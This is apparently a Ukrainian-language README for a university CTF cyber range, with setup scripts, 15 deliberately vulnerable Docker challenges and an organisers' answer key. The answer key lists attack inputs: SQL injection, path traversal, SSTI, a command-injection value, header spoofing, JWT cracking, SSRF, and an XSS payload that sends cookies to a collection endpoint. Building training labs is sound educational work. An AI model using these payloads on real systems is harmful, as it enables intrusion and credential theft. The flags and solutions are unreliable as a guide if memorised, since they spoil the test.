# LNTU Local Cyber Range (Університетський CTF ЛНТУ)

CTFd + **15 навчальних тасків** (кожен — окремий сайт у Docker) + опційно OpenVPN для гравців.
Усі сайти оформлені єдиним стилем (`challenges/_shared`), україномовні, дані вигадані.

Завдання впорядковані **від найлегшого до найскладнішого** та пронумеровані 01–15:

| Порядок | Бали | Рівень |
|---------|------|--------|
| 01–05 | 15 | Легкий |
| 06–10 | 20 | Середній |
| 11–15 | 25 | Складний |

Разом: **300 балів**. Підказка в CTFd коштує **5 балів**.

> Порядковий номер у назві (01–15) — це місце за складністю.
> Номер сервісу `flagN_ctf` відповідає порту `8080 + N` і може не збігатися з порядковим номером.

## 🚀 Швидкий старт
```bash
chmod +x ctf.sh
./ctf.sh setup            # Docker, збірка, запуск усього
# створіть адміна в CTFd (http://IP:8000), далі Admin → Settings → Access Tokens
./ctf.sh populate <TOKEN> # додає всі 15 тасків + прапори + підказки (наявні оновлює)
./ctf.sh check            # перевіряє, що кожен таск проходиться і віддає свій прапор
```
IP для гравців береться автоматично; змінити: `CTF_HOST=10.10.15.124 ./ctf.sh populate <TOKEN>`.

## Таски

| № | Назва | Категорія | Бали | Сервіс | Адреса |
|---|-------|-----------|------|--------|--------|
| 1 | ВолиньОбленерго — Забута резервна копія | Web / Recon | 15 | `flag11_ctf` | http://HOST:8091 |
| 2 | ВолиньВода — Чужий рахунок | Web / IDOR | 15 | `flag2_ctf` | http://HOST:8082 |
| 3 | LNTU Accounts — Витік токена | Web / Authentication | 15 | `flag5_ctf` | http://HOST:8085 |
| 4 | Деканат — Підміна ролі | Web / Cookies | 15 | `flag7_ctf` | http://HOST:8087 |
| 5 | SIGINT — Шари кодування | Crypto / Encoding | 15 | `flag12_ctf` | http://HOST:8092 |
| 6 | Intranet — Свій серед своїх | Web / HTTP Headers | 20 | `flag13_ctf` | http://HOST:8093 |
| 7 | Е-Архів — Вихід за межі каталогу | Web / LFI | 20 | `flag9_ctf` | http://HOST:8089 |
| 8 | Autumn Archive — Хвіст файлу | OSINT / Forensics | 20 | `flag6_ctf` | http://HOST:8086 |
| 9 | Затвор — Пошук без меж | Web / SQLi | 20 | `flag4_ctf` | http://HOST:8084 |
| 10 | ВолиньГаз — Шаблони заяв | Web / SSTI | 20 | `flag1_ctf` | http://HOST:8081 |
| 11 | LNTU NOC — Ping із сюрпризом | Web / Command Injection | 25 | `flag10_ctf` | http://HOST:8090 |
| 12 | Бібліотека API — Слабкий секрет | Web / JWT | 25 | `flag8_ctf` | http://HOST:8088 |
| 13 | Фотоархів — Приховане в пікселях | Forensics / Stego | 25 | `flag14_ctf` | http://HOST:8094 |
| 14 | LNTU Cyber Blog — Куки модератора | Web / XSS | 25 | `flag3_ctf` | http://HOST:8083 |
| 15 | LinkPreview — Звернення всередину | Web / SSRF | 25 | `flag15_ctf` | http://HOST:8095 |

## 🚩 Прапори та рішення (для організаторів, не показувати гравцям)
1. `CTF{r0b0ts_txt_l34ks_b4ckups}` — `[flag11_ctf]` `/robots.txt` → `/backup/site_config.old` → логін на `/admin/login`
2. `CTF{v0lyn_v0d4_1d0r_s3cr3t_fl4g}` — `[flag2_ctf]` `/user?id=1337`
3. `CTF{r3s3t_t0k3n_1s_n0t_s3cr3t}` — `[flag5_ctf]` Скинути `admin` → у відповіді посилання з токеном → відкрити його
4. `CTF{c00k13_r0l3_t4mp3r1ng_l4nds_4dm1n}` — `[flag7_ctf]` Кука `session_data` (Base64 JSON): змінити role на admin → `/admin`
5. `CTF{l4y3r3d_3nc0d1ng_1s_n0t_3ncrypt10n}` — `[flag12_ctf]` HEX → Base64 → ROT13
6. `CTF{h34d3rs_4r3_us3r_c0ntr0ll3d}` — `[flag13_ctf]` `X-Forwarded-For: 10.x.x.x`, `User-Agent: LNTU-Staff`, `Referer: http://intranet.lntu.local/`
7. `CTF{p4th_tr4v3rs4l_n0t_s0_s4f3}` — `[flag9_ctf]` `/view?file=....//....//etc/lntu/flag.txt`
8. `CTF{autumn_fox_metadata_tells_the_story}` — `[flag6_ctf]` `strings evidence.png` — прапор після маркера IEND
9. `CTF{z4tv0r_sqli_byp4ss_m4st3r}` — `[flag4_ctf]` `/?q=' UNION SELECT 1,flag,3 FROM secrets-- `
10. `CTF{v0lyn_g4s_sst1_3xpl01t_2026}` — `[flag1_ctf]` У полі «Примітка» → `{{config.SECRET_FLAG}}`
11. `CTF{c0mm4nd_1nj3ct10n_p1p3_th3_fl4g}` — `[flag10_ctf]` `127.0.0.1|cat /flag.txt`
12. `CTF{jwt_w34k_s3cr3t_cr4ck3d}` — `[flag8_ctf]` Зламати секрет `lntu2026` (hashcat -m 16500) → підробити `role=admin`
13. `CTF{lsb_st3g0_h1d1ng_1n_pl41n_s1ght}` — `[flag14_ctf]` LSB червоного каналу: `zsteg -a photo.png`
14. `CTF{xss_st0r3d_4dm1n_c00k13_st34l}` — `[flag3_ctf]` Пост `<img src=x onerror="fetch('/collect?d='+encodeURIComponent(document.cookie))">`, потім `/inbox`
15. `CTF{ssrf_1nt3rn4l_s3rv1c3_r34ch3d}` — `[flag15_ctf]` `/?url=http://127.1:9000/internal/flag`

## ⚙ Керування
`./ctf.sh help` — повний список (`up`, `down`, `restart <сервіс>`, `rebuild <сервіс>`, `status`, `logs`, `check`, `vpn-init`, `vpn-up`, `clean`).
Сервіси тасків називаються `flag1_ctf` … `flag15_ctf`.

Повторний `./ctf.sh populate <TOKEN>` безпечний: він оновлює назви, бали, порядок і підказки наявних тасків, не змінюючи їхні ID та прапори.

## 📁 Структура
```
ctf.sh                     керування
docker-compose.yaml        CTFd + MariaDB + Redis + 15 тасків (+ openvpn за профілем vpn)
challenges/_shared/        спільний стиль (theme.css, ui.py)
challenges/flagN_ctf/      код таска N (app.py, Dockerfile, requirements.txt)
scripts/challenges.py      єдине джерело: назви, бали, порядок, прапори, підказки, порти
scripts/populate_ctfd.py   наповнення й оновлення CTFd через API
scripts/check_challenges.py  автоматична самоперевірка всіх тасків
```
